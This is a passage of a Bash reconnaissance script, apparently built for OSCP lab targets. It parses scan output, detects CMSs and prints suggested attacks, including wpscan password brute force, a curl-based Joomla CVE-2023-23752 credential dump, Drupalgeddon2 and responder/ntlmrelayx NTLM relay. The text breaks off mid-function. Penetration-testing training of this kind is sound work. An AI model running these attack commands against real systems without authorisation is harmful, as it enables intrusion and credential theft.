#!/usr/bin/env bash
# =============================================================================
#  OSCP ENUM SCRIPT v3.0 — Intelligent Guided Recon
#  Features: Dynamic Menu | Recommendations | Auto-Recon | Tmux BG | Live Monitor
#  Usage : chmod +x oscp_enum.sh && ./oscp_enum.sh [TARGET_IP]
# =============================================================================

# -- Colors --------------------------------------------------------------------
RED='\033[0;31m';    LRED='\033[1;31m'
GREEN='\033[0;32m';  LGREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m';   LBLUE='\033[1;34m'
CYAN='\033[0;36m';   LCYAN='\033[1;36m'
PURPLE='\033[0;35m'; LPURPLE='\033[1;35m'
WHITE='\033[1;37m';  GRAY='\033[0;37m'
NC='\033[0m'
BOLD='\033[1m'
DIM='\033[2m'

# -- Global variables ----------------------------------------------------------
IP=""
DOMAIN=""
USER_CRED=""
PASS_CRED=""
PORTS=""                  # TCP ports (comma-separated)
PORTS_UDP=""              # UDP ports (comma-separated)
OS_TARGET="Unknown"       # Set automatically via TTL detection
OS_ICON="?"
LOOT_DIR=""
SESSION_LOG=""            # Master log file for this session

# Target tool definitions
NXC="nxc"
command -v netexec &>/dev/null && NXC="netexec"
if ! command -v nxc &>/dev/null && ! command -v netexec &>/dev/null && command -v crackmapexec &>/dev/null; then
    NXC="crackmapexec"
fi

# Intelligence dashboard data
declare -a SERVICES_VERSION=()   # "port:service:version" entries
declare -a DOMAINS_FOUND=()      # Domains/hostnames discovered

WORDLIST_DIR="/usr/share/seclists"
WORDLIST_MEDIUM="$WORDLIST_DIR/Discovery/Web-Content/raft-medium-directories.txt"
WORDLIST_USERS="$WORDLIST_DIR/Usernames/xato-net-10-million-usernames.txt"
WORDLIST_PASS="/usr/share/wordlists/rockyou.txt"
# -- Tier 1: Classic DirBuster medium (mas fiable para OSCP, solo directorios)
if [[ -f "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" ]]; then
    WORDLIST_MEDIUM="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
# -- Tier 2: SecLists raft-medium
elif [[ -f "$WORDLIST_MEDIUM" ]]; then
    : # already set above
# -- Tier 3: Jhaddix (ATENCION: contiene URLs completas, puede generar ruido)
elif [[ -f "/usr/share/wordlists/content_discovery_all.txt" ]]; then
    WORDLIST_MEDIUM="/usr/share/wordlists/content_discovery_all.txt"
# -- Tier 4: No wordlist found -> setup_config will offer to download
else
    WORDLIST_MEDIUM=""
fi

# Tmux session name for all background tasks
TMUX_SESSION="oscp_enum"

# -- Operational Constants -----------------------------------------------------
readonly NIKTO_MAXTIME=900          # Nikto max scan duration (seconds)
readonly NIKTO_MAXTIME_QUICK=300    # Nikto max for standalone/quick scans
readonly BG_WAIT_MAX=600            # Max seconds to wait for background scans
readonly BANNER_WIDTH=72            # Dashboard box character width
readonly -a KNOWN_WEB_PORTS=(80 443 8080 8443 8000 8888 3000 5000 9090)
# Puertos que usan HTTP internamente pero NO son portales web enumerables
readonly -a NON_WEB_PORTS=(5985 5986 47001 593 9389)

# -- Attacker IP detection (unified) ------------------------------------------
get_attacker_ip() {
    # Returns the attacker's IP dynamically based on route to target
    local _aip=""
    # First try dynamic routing to target if IP is known
    [[ -n "$IP" ]] && _aip=$(ip route get "$IP" 2>/dev/null | grep -oP 'src \K\S+')
    # Fallbacks if target IP routing fails or not set yet
    [[ -z "$_aip" ]] && _aip=$(ip -4 addr show tun0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1)
    [[ -z "$_aip" ]] && _aip=$(ip -4 addr show tap0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1)
    [[ -z "$_aip" ]] && _aip=$(ip -4 addr show eth0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1)
    [[ -z "$_aip" ]] && _aip="ATTACKER_IP"
    echo "$_aip"
}

# -- Port-to-Service mapping ---------------------------------------------------
declare -A PORT_SERVICE_MAP=(
    [21]="FTP"       [22]="SSH"       [23]="Telnet"    [25]="SMTP"
    [53]="DNS"       [69]="TFTP"      [79]="Finger"    [80]="HTTP"
    [88]="Kerberos"  [110]="POP3"     [111]="RPC"      [135]="MSRPC"
    [139]="NetBIOS"  [143]="IMAP"     [161]="SNMP"     [389]="LDAP"
    [443]="HTTPS"    [445]="SMB"      [464]="Kpasswd"  [512]="Rexec"
    [513]="Rlogin"   [514]="Rsh"      [593]="RPC-HTTP" [636]="LDAPS"
    [873]="Rsync"    [1099]="RMI"     [1433]="MSSQL"   [1521]="Oracle"
    [2049]="NFS"     [3306]="MySQL"   [3389]="RDP"     [5432]="PostgreSQL"
    [5900]="VNC"     [5985]="WinRM"   [5986]="WinRM-S" [6379]="Redis"
    [8080]="HTTP-Alt" [8443]="HTTPS-Alt" [8888]="HTTP-Alt2" [9200]="Elasticsearch"
    [27017]="MongoDB"
)

# -- Findings tracker ----------------------------------------------------------
declare -a FINDINGS=()
add_finding() {
    local new_find="$1"
    # Strip ANSI codes for comparison to prevent duplicates across tags
    local clean_new
    clean_new=$(echo "$new_find" | sed 's/\x1B\[[0-9;]*[a-zA-Z]//g')
    # For CVE findings, dedup by CVE ID only (ignore tag differences like [VULNS] vs [SCANS])
    local cve_id
    cve_id=$(echo "$clean_new" | grep -oP 'CVE-\d{4}-\d+' | head -1)
    for existing in "${FINDINGS[@]}"; do
        local clean_existing
        clean_existing=$(echo "$existing" | sed 's/\x1B\[[0-9;]*[a-zA-Z]//g')
        if [[ -n "$cve_id" ]]; then
            # CVE dedup: same CVE = same finding regardless of tag
            echo "$clean_existing" | grep -q "$cve_id" && return 0
        else
            # Non-CVE: exact match after stripping ANSI
            [[ "$clean_existing" == "$clean_new" ]] && return 0
        fi
    done
    FINDINGS+=("$new_find")
    [[ -n "$SESSION_LOG" ]] && echo "[$(_ts)] [FINDING] $new_find" >> "$SESSION_LOG"
    # Persist to disk so findings survive script restarts / crashes
    [[ -n "$LOOT_DIR" && -d "$LOOT_DIR" ]] && printf '%s\n' "$new_find" >> "$LOOT_DIR/.findings_cache.txt"
}

# -- Findings cache: persistence across script restarts -----------------------
load_findings_cache() {
    # Loads persisted findings from disk into FINDINGS[] without writing back to cache
    # Safe to call multiple times -> inline dedup prevents duplicates
    [[ -z "$LOOT_DIR" || ! -f "$LOOT_DIR/.findings_cache.txt" ]] && return
    local _loaded=0
    while IFS= read -r _cf; do
        [[ -z "$_cf" ]] && continue
        local _exists=false
        for _ex in "${FINDINGS[@]}"; do
            [[ "$_ex" == "$_cf" ]] && _exists=true && break
        done
        if ! $_exists; then
            FINDINGS+=("$_cf")
            ((_loaded++))
        fi
    done < "$LOOT_DIR/.findings_cache.txt"
    [[ $_loaded -gt 0 ]] && log_info "📂 Restaurados ${WHITE}$_loaded${NC} findings del cache de sesion anterior."
}

clear_findings_cache() {
    # Clears the on-disk cache and resets the array -> call when switching to a new target
    if [[ -n "$LOOT_DIR" && -d "$LOOT_DIR" ]]; then
        > "$LOOT_DIR/.findings_cache.txt"
        log_ok "Cache de findings limpiado."
    fi
    FINDINGS=()
}

# -- Step tracking helpers (for dashboard progress) ----------------------------
step_start() {  # $1=step_id (e.g. "s01") $2=step_name
    [[ -z "$LOOT_DIR" ]] && return
    mkdir -p "$LOOT_DIR/.status"
    echo "RUNNING|$(date +%s)|$2" > "$LOOT_DIR/.status/${1}.status"
}
step_done() {  # $1=step_id
    [[ -z "$LOOT_DIR" ]] && return
    local f="$LOOT_DIR/.status/${1}.status"
    [[ ! -f "$f" ]] && return
    local line; line=$(head -1 "$f")
    local name; name=$(echo "$line" | cut -d'|' -f3-)
    local start_ts; start_ts=$(echo "$line" | cut -d'|' -f2)
    echo "DONE|${start_ts}|${name}|$(date +%s)" > "$f"
}
step_skip() {  # $1=step_id $2=step_name $3=reason
    [[ -z "$LOOT_DIR" ]] && return
    mkdir -p "$LOOT_DIR/.status"
    echo "SKIPPED|$(date +%s)|$2|$3" > "$LOOT_DIR/.status/${1}.status"
}

# -- Port helpers --------------------------------------------------------------
has_port() {
    [[ -z "$PORTS" ]] && return 1
    echo ",$PORTS," | grep -q ",$1,"
}

has_any_port() {
    for p in "$@"; do
        has_port "$p" && return 0
    done
    return 1
}

get_service_name() {
    echo "${PORT_SERVICE_MAP[$1]:-Port $1}"
}

# List detected services from open ports
list_detected_services() {
    [[ -z "$PORTS" ]] && return
    local seen=""
    IFS=',' read -ra port_arr <<< "$PORTS"
    for p in "${port_arr[@]}"; do
        local svc="${PORT_SERVICE_MAP[$p]:-}"
        [[ -n "$svc" && "$seen" != *"$svc"* ]] && {
            echo "$p:$svc"
            seen="$seen $svc"
        }
    done
}

# -- /etc/hosts auto-suggestion ------------------------------------------------
suggest_hosts_entry() {
    # Usage: suggest_hosts_entry "HOSTNAME" "DOMAIN"
    # Prints a ready-to-run /etc/hosts line and adds it as a finding
    local _h="$1"   # short hostname (e.g. DC01)
    local _d="$2"   # domain       (e.g. corp.local)
    [[ -z "$_h" && -z "$_d" ]] && return
    [[ -z "$IP" ]] && return

    # Build the hosts entry
    local _entry="$IP"
    [[ -n "$_h" ]] && _entry+="  $_h"
    # Only add domain/FQDN if it looks like a real domain (contains a dot)
    if [[ -n "$_d" && "$_d" == *"."* && "$_d" != "$_h" ]]; then
        _entry+="  $_d"
        [[ -n "$_h" ]] && _entry+="  ${_h}.${_d}"  # FQDN
    fi

    echo -e "\n  ${YELLOW}${BOLD}[/etc/hosts]${NC} A?ade esta entrada (si no existe ya):"
    echo -e "  ${LGREEN}sudo bash -c 'echo \"$_entry\" >> /etc/hosts'${NC}"
    echo -e "  ${DIM}Verificar: grep -q \"$IP\" /etc/hosts && echo \"YA EXISTE\" || echo \"FALTA ANADIR\"${NC}"
    # Store as finding so it appears in the dashboard
    add_finding "💡 /etc/hosts: sudo bash -c 'echo \"$_entry\" >> /etc/hosts'"
}

# -- CMS detection -------------------------------------------------------------
CMS_DETECTED=""   # WordPress | Joomla | Drupal | empty

detect_cms() {
    # Detect CMS from whatweb output, curl headers, or common paths
    local base_url="$1"
    [[ -z "$base_url" ]] && return

    log_info "Detecting CMS on ${WHITE}$base_url${NC}..."

    local body
    body=$(curl -sL --max-time 10 "$base_url" 2>/dev/null)
    local headers
    headers=$(curl -sI --max-time 5 "$base_url" 2>/dev/null)

    # WordPress detection
    if echo "$body" | grep -qiE 'wp-content|wp-includes|wp-json|wordpress'; then
        CMS_DETECTED="WordPress"
        [[ -n "$LOOT_DIR" ]] && echo "WordPress" > "$LOOT_DIR/.cms_cache.txt"
        add_finding "🎯 CMS DETECTADO: ${LRED}WordPress${NC}"
        add_finding "💡 HACK: WP brute-force → wpscan --url $base_url -U <user> -P /usr/share/wordlists/rockyou.txt"
        add_finding "💡 HACK: WP leer auth → probar LFI en wp-config.php"
        log_ok "CMS detectado: ${LRED}${BOLD}WordPress${NC}"
        echo ""
        echo -e "  ${LPURPLE}+----------------------------------------------+${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${BOLD}WordPress detectado${NC} -> Ataques recomendados:   ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}|${NC}                                              ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${YELLOW}wpscan --url $base_url${NC}                       ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${YELLOW}  --enumerate u,p,t,vp${NC}                       ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}|${NC}                                              ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}|${NC}  🔍 Buscar: /wp-admin, /wp-login.php          ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}|${NC}  📖 Leer : /wp-config.php (LFI/backup)        ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}|${NC}  ⚡ xmlrpc: POST /xmlrpc.php (brute force)    ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}+----------------------------------------------+${NC}"
        return 0
    fi

    # Joomla detection
    if echo "$body" | grep -qiE 'joomla|com_content|/components/|/administrator/'; then
        CMS_DETECTED="Joomla"
        [[ -n "$LOOT_DIR" ]] && echo "Joomla" > "$LOOT_DIR/.cms_cache.txt"
        add_finding "🎯 CMS DETECTADO: ${LRED}Joomla${NC}"
        add_finding "💡 HACK: Joomla vulns → droopescan scan joomla --url $base_url"
        add_finding "💡 HACK: Joomla CVE-2023-23752 → curl ${base_url}/api/v1/users?public=true"
        log_ok "CMS detectado: ${LRED}${BOLD}Joomla${NC}"
        echo ""
        echo -e "  ${LPURPLE}+------------------------------------------------------------+${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${BOLD}Joomla detectado${NC} -> Ataques recomendados:                  ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}|${NC}                                                            ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${YELLOW}droopescan scan joomla --url $base_url${NC}                     ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}|${NC}                                                            ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}|${NC}  🔴 CVE-2023-23752 (API Auth Bypass / Credential Dump):    ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${YELLOW}curl ${base_url}/api/index.php/v1/config/application?public=true${NC} ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${YELLOW}curl ${base_url}/api/v1/users?public=true${NC}                    ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}|${NC}                                                            ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}|${NC}  🔍 Buscar: /administrator/                                 ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}|${NC}  📖 Leer : /configuration.php (LFI/backup)                  ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}+------------------------------------------------------------+${NC}"
        return 0
    fi

    # Drupal detection
    if echo "$body" | grep -qiE 'drupal|sites/default|/core/misc/drupal'; then
        CMS_DETECTED="Drupal"
        [[ -n "$LOOT_DIR" ]] && echo "Drupal" > "$LOOT_DIR/.cms_cache.txt"
        add_finding "🎯 CMS DETECTADO: ${LRED}Drupal${NC}"
        add_finding "💡 HACK: Drupal vulns → droopescan scan drupal --url $base_url"
        add_finding "💡 HACK: Drupalgeddon2 (CVE-2018-7600) → buscar exploits en searchsploit"
        log_ok "CMS detectado: ${LRED}${BOLD}Drupal${NC}"
        echo ""
        echo -e "  ${LPURPLE}+----------------------------------------------+${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${BOLD}Drupal detectado${NC} -> Ataques recomendados:      ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}|${NC}                                              ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${YELLOW}droopescan scan drupal --url $base_url${NC}       ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}|${NC}                                              ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}|${NC}  🔍 Buscar: /admin, /user/login                ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}|${NC}  📖 Leer : /sites/default/settings.php        ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}|${NC}  ⚡ Probar: Drupalgeddon2 (CVE-2018-7600)     ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}+----------------------------------------------+${NC}"
        return 0
    fi

    # Also check whatweb output if exists (handling port-aware files)
    if grep -qi "wordpress" "$LOOT_DIR"/web/whatweb*.txt 2>/dev/null; then
        CMS_DETECTED="WordPress"
        [[ -n "$LOOT_DIR" ]] && echo "WordPress" > "$LOOT_DIR/.cms_cache.txt"
        add_finding "🎯 CMS DETECTADO: WordPress (vía whatweb)"
        add_finding "💡 HACK: wpscan --url http://$IP -e u,vp,vt --plugins-detection aggressive"
        add_finding "💡 HACK: WP brute → wpscan --url http://$IP -U admin -P /usr/share/wordlists/rockyou.txt"
    elif grep -qi "joomla" "$LOOT_DIR"/web/whatweb*.txt 2>/dev/null; then
        CMS_DETECTED="Joomla"
        [[ -n "$LOOT_DIR" ]] && echo "Joomla" > "$LOOT_DIR/.cms_cache.txt"
        add_finding "🎯 CMS DETECTADO: Joomla (vía whatweb)"
        add_finding "💡 HACK: joomscan -u http://$IP"
        add_finding "💡 HACK: Joomla admin → http://$IP/administrator/"
    elif grep -qi "drupal" "$LOOT_DIR"/web/whatweb*.txt 2>/dev/null; then
        CMS_DETECTED="Drupal"
        [[ -n "$LOOT_DIR" ]] && echo "Drupal" > "$LOOT_DIR/.cms_cache.txt"
        add_finding "🎯 CMS DETECTADO: Drupal (vía whatweb)"
        add_finding "💡 HACK: droopescan scan drupal -u http://$IP"
        add_finding "💡 HACK: Drupalgeddon2 → searchsploit drupalgeddon"
    fi

    if [[ -z "$CMS_DETECTED" ]]; then
        log_info "No se detectó CMS conocido (puede ser custom)."
    fi
}

# -- Auto-parse findings from scan output --------------------------------------
parse_scan_findings() {
    # Parses a scan output file and auto-extracts interesting findings
    local file="$1"
    local scan_name="${2:-scan}"
    local tag="[${scan_name^^}]"
    
    [[ ! -f "$file" ]] && return

    local found_something=false

    # Extract CVEs — filter out falsy outputs
    local cves
    cves=$(grep -iP 'CVE-\d{4}-\d+' "$file" 2>/dev/null \
        | grep -ivP '(NOT\s+VULNERABLE|false|patched)' \
        | grep -oP 'CVE-\d{4}-\d+' \
        | sort -u)
    if [[ -n "$cves" ]]; then
        while IFS= read -r cve; do
            add_finding "${LRED}🔴 CVE $tag:${NC} $cve"
            echo -e "  ${LRED}${BOLD}  ⚠ CVE ENCONTRADO: $cve${NC}"
        done <<< "$cves"
        found_something=true
    fi

    # Extract VULNERABLE keywords — exclude false positives
    local vulns
    vulns=$(grep -i "VULNERABLE" "$file" 2>/dev/null | grep -ivP '(NOT\s+VULNERABLE|false|patched)' | head -5)
    if [[ -n "$vulns" ]]; then
        while IFS= read -r v; do
            local clean_v
            clean_v=$(echo "$v" | sed 's/^[[:space:]]*//' | head -c 80)
            add_finding "${LRED}💥 VULNERABLE $tag:${NC} $clean_v"
            echo -e "  ${LRED}${BOLD}  💥 VULNERABLE: $clean_v${NC}"
        done <<< "$vulns"
        found_something=true
    fi

    # Detect anonymous/null access
    if grep -qiE 'anonymous.*allowed|anon.*login|null.*session|guest.*access|READ.*ONLY' "$file" 2>/dev/null; then
        add_finding "${YELLOW}🔓 ANON/NULL ACCESS $tag${NC}"
        echo -e "  ${YELLOW}${BOLD}  🔓 ACCESO ANÓNIMO/NULL DETECTADO${NC}"
        found_something=true
    fi

    # Detect accessible SMB shares from nxc_shares.txt (old fallback -> kept for legacy runs)
    if [[ "$file" == *"nxc_shares"* ]]; then
        local read_shares
        # Robust: extract share name that precedes READ/WRITE regardless of column width
        read_shares=$(grep -iE '\bREAD\b|\bWRITE\b' "$file" 2>/dev/null \
            | grep -ivE 'IPC\$|Error|ACCESS_DENIED' \
            | grep -oP '(?<=\s{2,})[A-Za-z0-9._$-]+(?=\s+(?:READ|NO ACCESS))' \
            | sort -u)
        if [[ -z "$read_shares" ]]; then
            # Fallback: last word before READ on each line
            read_shares=$(grep -iE '\bREAD\b' "$file" 2>/dev/null \
                | grep -ivE 'IPC\$|Error' \
                | sed -E 's/.*\s([A-Za-z0-9._$-]+)\s+READ.*/\1/' | sort -u)
        fi
        if [[ -n "$read_shares" ]]; then
            while IFS= read -r share; do
                [[ -n "$share" ]] && add_finding "💡 HACK: smbclient //${IP:-127.0.0.1}/$share -N"
            done <<< "$read_shares"
            found_something=true
        fi
    fi

    # Detect credentials / passwords -> filter out enum4linux random usernames and protocol errors
    local creds
    creds=$(grep -iP 'password[:\s=]+\S+|credentials?[:\s]+\S+|user(name)?[:\s=]+\S+.*pass' "$file" 2>/dev/null \
        | grep -ivE 'random_user|cmtubfpv|akezmapz|[a-z]{8}\s+and password|Server allows authentication via username' \
        | grep -ivE 'Server doesn.t allow session|Password required|Login or password incorrect|Please log in with|empty-password:|Password \.+|\s+password\s*$|assword[:\s=]+None|assword[:\s=]+none' \
        | head -3)
    if [[ -n "$creds" ]]; then
        while IFS= read -r c; do
            local clean_c
            clean_c=$(echo "$c" | sed 's/^[[:space:]]*//' | head -c 100)
            add_finding "${LGREEN}🔑 CREDENCIAL $tag:${NC} $clean_c"
            echo -e "  ${LGREEN}${BOLD}  🔑 CREDENCIAL ENCONTRADA: $clean_c${NC}"
        done <<< "$creds"
        found_something=true
    fi

    # Parse nxc_shares.txt -> hostname, domain, SMB signing, readable shares
    if [[ "$file" == *"nxc_shares"* ]]; then
        local _nxc_host _nxc_domain _nxc_sign
        # CME format: (name:HOSTNAME) (domain:DOMAIN) (signing:True|False)
        _nxc_host=$(grep -oP '\(name:\K[^)]+' "$file" 2>/dev/null | head -1 | tr -d ' ')
        _nxc_domain=$(grep -oP '\(domain:\K[^)]+' "$file" 2>/dev/null | head -1 | tr -d ' ')
        _nxc_sign=$(grep -oP '\(signing:\K[^)]+' "$file" 2>/dev/null | head -1 | tr -d ' ')
        [[ -n "$_nxc_host" ]]   && add_finding "🖥  HOSTNAME: $_nxc_host"
        [[ -n "$_nxc_domain" ]] && add_finding "🏢 DOMAIN:   $_nxc_domain"
        # Auto-suggest /etc/hosts entry when hostname or domain is discovered
        [[ -n "$_nxc_host" || -n "$_nxc_domain" ]] && suggest_hosts_entry "$_nxc_host" "$_nxc_domain"
        if [[ "$_nxc_sign" == "False" ]]; then
            add_finding "${LRED}🚨 CRÃTICO: SMB SIGNING DESHABILITADO -> vulnerable a NTLM Relay${NC}"
            add_finding "💣 ATAQUE: responder -I tun0 -wdv   +   ntlmrelayx.py -tf targets.txt -smb2support"
        fi
        local _nxc_shares
        # Robust: capture share name directly before READ/WRITE/NO ACCESS token
        _nxc_shares=$(grep -iE '\bREAD ONLY\b|\bREAD,\s*WRITE\b' "$file" 2>/dev/null \
            | grep -ivE 'IPC\$|Error|ACCESS_DENIED' \
            | grep -oP '[A-Za-z0-9._$-]+(?=\s+(?:READ ONLY|READ,\s*WRITE))' \
            | sort -u)
        if [[ -z "$_nxc_shares" ]]; then
            # Fallback: token before the last READ on each line
            _nxc_shares=$(grep -iE '\bREAD\b' "$file" 2>/dev/null \
                | grep -ivE 'IPC\$|Error' \
                | sed -E 's/.*\s([A-Za-z0-9._$-]+)\s+READ.*/\1/' | sort -u)
        fi
        if [[ -n "$_nxc_shares" ]]; then
            while IFS= read -r s; do
                [[ -n "$s" ]] && add_finding "📁 SHARE LEGIBLE (CME): $s"
            done <<< "$_nxc_shares"
        fi
        found_something=true
    fi

    # Parse smbmap.txt -> readable shares with guest
    if [[ "$file" == *"smbmap"* ]] && [[ "$file" != *"recursive"* ]] && [[ "$file" != *"auth"* ]]; then
        local _guest_shares
        # smbmap format: "        ShareName      READ ONLY    Comment"
        # Robust: extract the share name (first word after leading whitespace)
        # that appears on a line containing READ/WRITE permissions
        _guest_shares=$(grep -iE 'READ ONLY|READ, WRITE' "$file" 2>/dev/null \
            | grep -ivE 'IPC\$|print\$' \
            | sed -E 's/^[[:space:]]*//' \
            | grep -oP '^[A-Za-z0-9._$-]+' \
            | sort -u)
        if [[ -z "$_guest_shares" ]]; then
            # Fallback for smbmap2 format: share name before large whitespace gap
            _guest_shares=$(grep -iE 'READ ONLY|READ, WRITE' "$file" 2>/dev/null \
                | grep -ivE 'IPC\$|print\$' \
                | grep -oP '[A-Za-z0-9._$-]+(?=\s{3,}(?:READ|NO))' \
                | sort -u)
        fi
        if [[ -n "$_guest_shares" ]]; then
            add_finding "${YELLOW}📂 GUEST SESSION ACTIVA -> shares accesibles:${NC}"
            while IFS= read -r s; do
                [[ -n "$s" ]] && add_finding "  📄 $s (READ ONLY)"
            done <<< "$_guest_shares"
        fi
        found_something=true
    fi

    # Parse smbmap_recursive_guest -> list files found inside shares
    if [[ "$file" == *"smbmap_recursive"* ]] && [[ "$file" != *"auth"* ]]; then
        local _file_count
        _file_count=$(grep -cP '\.\w{2,5}\s' "$file" 2>/dev/null || echo 0)
        if (( _file_count > 0 )); then
            add_finding "📁 SMB RECURSIVE GUEST: $_file_count archivos encontrados en shares"
            # Report interesting files
            local _interesting
            _interesting=$(grep -iP '\.(ps1|bat|cmd|vbs|txt|xml|conf|config|ini|bak|old|zip|sql|key|pem|pfx|crt|log|credentials?|password|secret)\b' "$file" 2>/dev/null | head -10)
            if [[ -n "$_interesting" ]]; then
                add_finding "${LRED}🔴 ARCHIVOS INTERESANTES EN SMB:${NC}"
                while IFS= read -r ifile; do
                    local clean_if
                    clean_if=$(echo "$ifile" | sed 's/^[[:space:]]*//' | head -c 120)
                    add_finding "  -> $clean_if"
                done <<< "$_interesting"
            fi
        fi
        found_something=true
    fi

    # Parse ffuf_params output -> report 200-OK hits as potential parameters
    if [[ "$file" == *"ffuf_params"* ]]; then
        local _ffuf_hits
        _ffuf_hits=$(grep -P '"status"\s*:\s*200|\b200\b.*\bGET\b' "$file" 2>/dev/null | head -10)
        if [[ -z "$_ffuf_hits" ]]; then
            _ffuf_hits=$(grep -oP '(?<=\| ).*(?= \|)' "$file" 2>/dev/null | grep -v '^$' | head -10)
        fi
        if [[ -n "$_ffuf_hits" ]]; then
            add_finding "🔍 FFUF PARAMS $tag: parÃ¡metros con respuesta 200"
            while IFS= read -r h; do
                add_finding "  -> $h"
            done <<< "$(echo "$_ffuf_hits" | head -5)"
            found_something=true
        fi
    fi

    # Detect phpinfo.php exposure
    if grep -qi 'phpinfo\.php' "$file" 2>/dev/null; then
        add_finding "${LRED}🔴 PHPINFO $tag:${NC} /phpinfo.php expuesto — revela config del servidor"
        echo -e "  ${LRED}${BOLD}  🔴 PHPINFO.PHP EXPUESTO${NC}"
        found_something=true
    fi

    # Detect http-enum directories (from Nmap vuln scan)
    local httenum_dirs
    httenum_dirs=$(grep -oP '^\s*/\S+:\s+\K.+' "$file" 2>/dev/null | grep -i 'director\|folder\|listing\|phpinfo\|config\|install\|backup' | head -8)
    if [[ -z "$httenum_dirs" ]]; then
        # Alternative: lines starting with |  /path: in nmap http-enum output
        httenum_dirs=$(grep -oP '\|\s+\K/\S+(?=:)' "$file" 2>/dev/null | head -10)
    fi
    if [[ -n "$httenum_dirs" ]]; then
        while IFS= read -r dir; do
            [[ -n "$dir" ]] && add_finding "${LPURPLE}|? WEB-DIR $tag:${NC} $dir"
        done <<< "$httenum_dirs"
        found_something=true
    fi

    # Detect SQL Injection markers (from Nmap http-sql-injection)
    if grep -qi 'sqli\|sql-injection\|sqlspider\|Possible sqli' "$file" 2>/dev/null; then
        local sqli_urls
        sqli_urls=$(grep -oP "http://\S+" "$file" 2>/dev/null | grep -i 'sqli\|sqlspider\|OR' | head -3)
        add_finding "${LRED}💉 SQLI $tag:${NC} Posible SQL Injection detectada por Nmap"
        if [[ -n "$sqli_urls" ]]; then
            while IFS= read -r url; do
                add_finding "${YELLOW}  ↳ URL:${NC} $url"
            done <<< "$sqli_urls"
        fi
        echo -e "  ${LRED}${BOLD}  💉 POSIBLE SQL INJECTION — revisar manualmente${NC}"
        found_something=true
    fi

    # Detect open directory listings
    if grep -qi "directory.*listing\|Index of\|Parent Directory" "$file" 2>/dev/null; then
        local listing_paths
        listing_paths=$(grep -oP '/\S+(?=.*listing)' "$file" 2>/dev/null | head -3)
        add_finding "${YELLOW}📂 DIR-LISTING $tag:${NC} Directory listing activo"
        echo -e "  ${YELLOW}${BOLD}  📂 DIRECTORY LISTING ACTIVO${NC}"
        found_something=true
    fi

    # Parse Gobuster/Feroxbuster output — ALL 200/301 URLs for dashboard
    # Gobuster format: /path  (Status: 200)  [Size: 1234]
    # Feroxbuster format: 200      GET      123l      456w     7890c http://target/path
    if echo "$file" | grep -qi 'gobuster\|ferox'; then
        # Build base URL from filename (port extraction)
        local _gb_port
        _gb_port=$(echo "$file" | grep -oP 'port\K\d+' || echo "80")
        local _gb_proto="http"
        [[ "$_gb_port" == "443" || "$_gb_port" == "8443" ]] && _gb_proto="https"
        local _gb_base="${_gb_proto}://${IP}"
        [[ "$_gb_port" != "80" && "$_gb_port" != "443" ]] && _gb_base="${_gb_base}:${_gb_port}"

        # Detect format: feroxbuster starts with status code, gobuster starts with /path
        local _is_ferox=false
        head -5 "$file" 2>/dev/null | grep -qP '^\d{3}\s+\w+\s+' && _is_ferox=true

        if $_is_ferox; then
            # Feroxbuster format: 200   GET   123l   456w   7890c http://target/path
            local ferox_200
            ferox_200=$(grep -P '^200\s' "$file" 2>/dev/null | head -30)
            if [[ -n "$ferox_200" ]]; then
                while IFS= read -r ferox_line; do
                    local ferox_url ferox_size
                    ferox_url=$(echo "$ferox_line" | grep -oP 'https?://\S+' | head -1)
                    ferox_size=$(echo "$ferox_line" | awk '{print $5}' | sed 's/c$//')
                    [[ -n "$ferox_url" ]] && add_finding "${LGREEN}🟢 200 OK:${NC} ${ferox_url}  ${DIM}[${ferox_size:-?}B]${NC}"
                done <<< "$ferox_200"
                found_something=true
            fi
            local ferox_301
            ferox_301=$(grep -P '^301\s' "$file" 2>/dev/null | head -15)
            if [[ -n "$ferox_301" ]]; then
                while IFS= read -r ferox_line; do
                    local ferox_url
                    ferox_url=$(echo "$ferox_line" | grep -oP 'https?://\S+' | head -1)
                    [[ -n "$ferox_url" ]] && add_finding "${CYAN}🔀 301 DIR:${NC} ${ferox_url}"
                done <<< "$ferox_301"
                found_something=true
            fi
        else
            # Gobuster format: /path  (Status: 200)  [Size: 1234]
            local gb_200ok
            gb_200ok=$(grep -P 'Status:\s*200' "$file" 2>/dev/null | head -30)
            if [[ -n "$gb_200ok" ]]; then
                while IFS= read -r gb_line; do
                    local gb_path gb_size
                    gb_path=$(echo "$gb_line" | grep -oP '^/\S+' | head -1)
                    gb_size=$(echo "$gb_line" | grep -oP 'Size:\s*\K\d+' | head -1)
